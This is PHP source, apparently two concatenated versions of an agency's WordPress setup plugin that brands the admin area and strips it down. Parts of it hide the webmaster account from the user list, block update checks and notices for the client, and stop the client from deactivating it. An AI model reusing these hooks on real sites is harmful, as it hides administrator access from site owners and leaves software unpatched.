<?php
/**
 * @package DOTSQRPress
 * @version 1.0
 */
/*
Plugin Name: DOTSQRPress Setup
Contributors: @gallettigr
Plugin URI: http://dotsqr.co
Description: Setup plugin for DOTSQRPress. Can't be deactivated by client.
Author: @gallettigr
Version: 1.0
Author URI: http://www.twitter.com/gallettigr
Textdomain: dotsqrpress_core
Domain Path: /languages/
*/


# LOAD OPTION-TREE FRAMEWORK, VISIT GITHUB REPO FOR MORE INFO (github.com/valendesigns/option-tree)
include( 'option-tree/ot-loader.php' );

# ADMIN STYLING
add_action('admin_head', 'dotsqrpress_admin_style');
function dotsqrpress_admin_style(){
	wp_register_script('dotsqrpress_admin', WP_SITEURL . CORE_ASSET . 'css/dotsqrpress_admin.css');
	wp_register_script('dotsqrpress_fontawesome', WP_SITEURL . CORE_ASSET . 'css/font-awesome.min.css');
	wp_register_script('dotsqrpress_admin', WP_SITEURL . CORE_ASSET . 'js/dotsqrpress_admin.min.js');
	wp_enqueue_style('dotsqrpress_admin', WP_SITEURL . CORE_ASSET . 'css/dotsqrpress_admin.css', false, null, false);
	wp_enqueue_style('dotsqrpress_fontawesome', WP_SITEURL . CORE_ASSET . 'css/font-awesome.min.css', false, null, false);
	wp_enqueue_script( 'dotsqrpress_admin_js', WP_SITEURL . CORE_ASSET . 'js/dotsqrpress_admin.min.js', array('jquery'), null, true );
	//wp_enqueue_style('dotsqrpress_bootstrap', WP_SITEURL . '/views/css/styles.css', false, null, true);
	wp_enqueue_script( 'dotsqrpress_bootstrapjs', WP_SITEURL . '/views/js/bootstrap.min.js', array('jquery'), null, false );
}

# ADD CUSTOM COLOR CONSTANTS
function dotsqrpress_main_color() {
	echo '<style>.dotsqrpress_bg, .wp-core-ui .button-primary, .wrap .add-new-h2:hover{background-color: ' . MAIN_COLOR . ' !important; text-decoration: none !important; color: white !important;} .dotsqrpress_col {color: ' . MAIN_COLOR . '; text-decoration: none !important;}</style>';
}
add_filter('wp_head', 'dotsqrpress_main_color');
add_filter('admin_head', 'dotsqrpress_main_color');

#DISABLE AUTOSAVE
add_action( 'admin_init', 'dotsqrpress_disable_autosave' );
function dotsqrpress_disable_autosave(){
    wp_deregister_script('autosave');
}

# DOTSQRPRESS DEFAULT EXCERPT LENGHT & ELLIPSES
function dotsqrpress_excerpet_lenght($length) {
    return POST_EXCERPT_LENGTH;
}
add_filter('excerpt_length', 'dotsqrpress_excerpet_lenght');
function dotsqrpress_excerpet_ellipses($more) {
	return '...';
}
add_filter('excerpt_more', 'dotsqrpress_excerpet_ellipses');

# MAKE HTML EDITOR DEFAULT ONE
add_filter( 'wp_default_editor', create_function('', 'return "html";') );


# SIMPLIFY CUSTOMER BACKEND AND SHOW ADVANCED OPTIONS ONLY TO SUPER ADMIN
add_action('admin_init','dotsqrpress_custom_admin_ui', 2);
function dotsqrpress_custom_admin_ui() {
	global $menu;
	global $current_user;
	get_currentuserinfo();
	if($current_user->user_login !== MAIN_USER && defined('MAIN_USER')) {
		remove_action( 'admin_notices', 'update_nag');
		remove_action( 'init', 'wp_version_check');
		remove_menu_page('ot-settings');
		add_filter( 'pre_option_update_core', '__return_null' );
		add_filter('pre_site_transient_update_core','__return_null');
		add_filter('pre_site_transient_update_plugins','__return_null');
		add_filter('pre_site_transient_update_themes','__return_null');
		remove_action('load-update-core.php','wp_update_plugins');
		add_filter( 'ot_show_new_layout', '__return_false', 9999 );
	}
}

# HIDE WEBMASTER FROM USER LIST FOR OTHER USERS
function dotsqrpress_hide_webmaster($user_search) {
  global $current_user;
  $username = $current_user->user_login;
  if ($username !== MAIN_USER && defined('MAIN_USER')) {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != '" . MAIN_USER . "'",$user_search->query_where);
  }
}
add_action('pre_user_query','dotsqrpress_hide_webmaster');


?>

<?php
/**
 * @package MelaPress
 * @version 1.0
 */
/*
Plugin Name: DOTSQRPress Setup
Contributors: @gallettigr
Plugin URI: http://dotsqr.co
Description: Setup plugin for DOTSQRPress. Can't be deactivated by client.
Author: @gallettigr
Version: 1.0
Author URI: http://www.twitter.com/gallettigr
Textdomain: dotsqrpress_core
Domain Path: /languages/
*/

# DOTSQRPRESS DEFINITIONS
$get_theme_name = explode('/themes/', get_template_directory());
define('CORE_ASSET', '/core/assets/'); // MODIFY ONLY IF YOU RENAMED THE DOTSQRPRESS CORE AND CORE ASSETS FOLDER
define('DOTSQRPRESS_CONTENTS', 'wp-content' ); // CHANGE ONLY IF YOU DEFINED A DIFFERENT FOLDER FOR CONTENTS
define('THEME_NAME', next($get_theme_name));
define('THEME_PATH', DOTSQRPRESS_CONTENTS . '/themes/' . THEME_NAME);


# LOAD OPTION-TREE FRAMEWORK AND SETTINGS, VISIT GITHUB REPO FOR MORE INFO (github.com/valendesigns/option-tree)
include( 'option-tree/ot-loader.php' );


# LOAD WP-API PLUGIN AND MODULES, VISIT WEBSITE FOR MORE INFO (wp-api.com)
include( 'api/plugin.php' );
include( 'api/oauth1/oauth-server.php' );
remove_action( 'wp_head', 'json_output_link_wp_head', 10 );

# LOAD METABOXES
include( 'metabox/meta-box.php' );


# DOTSQRPRESS LOGIN STYLING. REMOVES DEFAULT WP CSS WHICH IS FORCED INTO HEADER, ADDS DOTSQRPRESS CSS.
remove_filter('wp_admin_css', 'login', 99999);
add_filter('wp_admin_css', 'dotsqrpress_default_styles', 99999);
function dotsqrpress_default_styles($force_echo) {
  return false;
}
add_action( 'login_init', 'dotsqrpress_remove_login_scripts' );
function dotsqrpress_remove_login_scripts() {
  wp_deregister_style( 'wp-admin' );
  wp_deregister_style( 'login' );
}
add_action( 'login_enqueue_scripts', 'dotsqrpress_login_style' );
function dotsqrpress_login_style() {
  wp_enqueue_style( 'dotsqrpress_core', WP_SITEURL . CORE_ASSET . 'css/core.css', false, null, true );
  wp_enqueue_script( 'dotsqrpress_corejs', WP_SITEURL . CORE_ASSET . 'js/core.min.js', array('jquery'), null, true );
}
add_filter( 'login_headerurl', 'dotsqrpress_login_logourl' );
function dotsqrpress_login_logourl() {
  return get_option('siteurl');
}
add_filter( 'login_headertitle', 'dotsqrpress_login_logotitle' );
function dotsqrpress_login_logotitle() {
  return get_option('blogname');
}

# DISABLE LOGIN DETAILED ERRORS
function dotsqrpress_disable_login_errors(){
  return '<strong>Login Error.</strong>';
}
add_filter( 'login_errors', 'dotsqrpress_disable_login_errors' );


# ADD DOTSQRPRESS META PROFILE
function dotsqrpress_profile() {
  ?>
  <meta name="agency" content="Mela Communication">
  <meta name="developer" content="gallettigr@mail.ru">
  <meta name="framework" content="DOTSQRPRESS">
  <meta name="copyright" content="&copy; <?php echo date('Y') . ' ' . get_bloginfo('name'); ?>"/>
  <?php
}
add_action('wp_head','dotsqrpress_profile', 1);

# HIDE DEFAULT DASHBOARD WIDGETS
function dotsqrpress_hide_dashboard_widgets() {
  remove_meta_box( 'dashboard_plugins', 'dashboard', 'normal' );
  remove_meta_box( 'dashboard_primary', 'dashboard', 'normal' );
  remove_meta_box( 'dashboard_secondary', 'dashboard', 'normal' );
  remove_meta_box( 'dashboard_incoming_links', 'dashboard', 'normal' );
  //remove_meta_box( 'dashboard_quick_press', 'dashboard', 'side' );
  remove_meta_box( 'dashboard_recent_drafts', 'dashboard', 'side' );
  remove_meta_box( 'dashboard_recent_comments', 'dashboard', 'normal' );
  remove_meta_box( 'dashboard_right_now', 'dashboard', 'normal' );
  //remove_meta_box( 'dashboard_activity', 'dashboard', 'normal');
  remove_action( 'welcome_panel', 'wp_welcome_panel' );
}
add_action('admin_init', 'dotsqrpress_hide_dashboard_widgets');


# ADMIN STYLING
add_action('admin_head', 'dotsqrpress_admin_style');
function dotsqrpress_admin_style(){
  wp_enqueue_style('dotsqrpress_core', WP_SITEURL . CORE_ASSET . 'css/core.css');
  wp_enqueue_script( 'dotsqrpress_corejs', WP_SITEURL . CORE_ASSET . 'js/core.min.js', array('jquery'), null, true );
}

# ADD CUSTOM COLOR CONSTANTS
function dotsqrpress_main_color() {
  echo '<style>.dotsqrpress_bg, .wp-core-ui .button-primary, .wrap .add-new-h2:hover{background-color: ' . MAIN_COLOR . ' !important; text-decoration: none !important; color: white !important;} .dotsqrpress_col {color: ' . MAIN_COLOR . '; text-decoration: none !important;}</style>';
}
add_filter('admin_head', 'dotsqrpress_main_color');

# ADMIN TITLE FILTER
add_filter('admin_title', 'dotsqrpress_admin_title', 10, 2);
function dotsqrpress_admin_title($admin_title, $title)
{
  return get_bloginfo('name').' - '.$title . ' | MelaPress';
}

# DISABLE HTML COMMENTS
add_filter( 'pre_comment_content', 'wp_specialchars' );

#DISABLE AUTOSAVE
add_action( 'admin_init', 'dotsqrpress_disable_autosave' );
function dotsqrpress_disable_autosave(){
  wp_deregister_script('autosave');
}

# DOTSQRPRESS DEFAULT EXCERPT LENGHT & ELLIPSES
function dotsqrpress_excerpet_lenght($length) {
  return POST_EXCERPT_LENGTH;
}
add_filter('excerpt_length', 'dotsqrpress_excerpet_lenght');
function dotsqrpress_excerpet_ellipses($more) {
  return '...';
}
add_filter('excerpt_more', 'dotsqrpress_excerpet_ellipses');

# MAKE HTML EDITOR DEFAULT ONE
add_filter( 'wp_default_editor', create_function('', 'return "html";') );

# CLEANUP AVATAR CLASSES AND LOCAL IMG URL
add_filter( 'get_avatar', 'swappyt_avatar', 15 );
function swappyt_avatar ($avatar) {
  global $current_user;
  $user_info = get_userdata($current_user->ID);
  if(preg_match('/gravatar/i', $avatar)) {
    $pattern = array( '/(src="(.*?)=)/', '/(&amp(.*?)")/' );
    $replace = array( 'src="', '"' );
    $avatar_url = preg_replace($pattern, $replace, $avatar);
  } else {
    $avatar_url = $avatar;
  }
  $pattern = array( '(class="(.*?)")' );
  $replace = array( 'class="avatar ' . implode(' ', $user_info->roles) .' ' . $current_user->user_login . '"' );
  $avatar_url = preg_replace($pattern, $replace, $avatar_url);

  return $avatar_url;
}


# REMOVE WORDPRESS DEFAULT META BOXES
function dotsqrpress_remove_default_metaboxes() {
 remove_meta_box( 'postcustom','post','normal' );
 remove_meta_box( 'postexcerpt','post','normal' );
 remove_meta_box( 'commentstatusdiv','post','normal' );
 remove_meta_box( 'trackbacksdiv','post','normal' );
 remove_meta_box( 'authordiv','post','normal' );
 remove_meta_box( 'postcustom','page','normal' );
 remove_meta_box( 'postexcerpt','page','normal' );
 remove_meta_box( 'commentstatusdiv','page','normal' );
 remove_meta_box( 'trackbacksdiv','page','normal' );
 remove_meta_box( 'authordiv','page','normal' );
}
add_action('admin_menu','dotsqrpress_remove_default_metaboxes');

# REMOVE WORDPRESS DEFAULT WIDGETS
function dotsqrpress_remove_default_widgets() {
  unregister_widget('WP_Widget_Pages');
  unregister_widget('WP_Widget_Calendar');
  unregister_widget('WP_Widget_Archives');
  unregister_widget('WP_Widget_Links');
  unregister_widget('WP_Widget_Meta');
  unregister_widget('WP_Widget_Search');
  unregister_widget('WP_Widget_Text');
  unregister_widget('WP_Widget_Categories');
  unregister_widget('WP_Widget_Recent_Posts');
  unregister_widget('WP_Widget_Recent_Comments');
  unregister_widget('WP_Widget_RSS');
  unregister_widget('WP_Widget_Tag_Cloud');
}
add_action('widgets_init', 'dotsqrpress_remove_default_widgets', 1);

# SIMPLIFY CUSTOMER BACKEND AND SHOW ADVANCED OPTIONS ONLY TO SUPER ADMIN
add_action('admin_init','dotsqrpress_custom_admin_ui', 2);
function dotsqrpress_custom_admin_ui() {
  global $menu;
  global $current_user;
  get_currentuserinfo();
  if($current_user->user_login !== MAIN_USER && defined('MAIN_USER')) {
    remove_action( 'admin_notices', 'update_nag');
    remove_action( 'init', 'wp_version_check');
    remove_menu_page('ot-settings');
    add_filter( 'pre_option_update_core', '__return_null' );
    add_filter('pre_site_transient_update_core','__return_null');
    add_filter('pre_site_transient_update_themes','__return_null');
    remove_action('load-update-core.php','wp_update_plugins');
    add_filter('pre_site_transient_update_plugins','__return_null');
    add_filter( 'ot_show_new_layout', '__return_false', 9999 );
    add_filter( 'ot_show_docs', '__return_false', 9999 );
    remove_menu_page('edit.php');
  }
}

# HIDE WEBMASTER FROM USER LIST FOR OTHER USERS
  function dotsqrpress_hide_webmaster($user_search) {
    global $current_user;
    $username = $current_user->user_login;
    if ($username !== MAIN_USER && defined('MAIN_USER')) {
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
        "WHERE 1=1 AND {$wpdb->users}.user_login != '" . MAIN_USER . "'",$user_search->query_where);
    }
  }
  add_action('pre_user_query','dotsqrpress_hide_webmaster');


?>

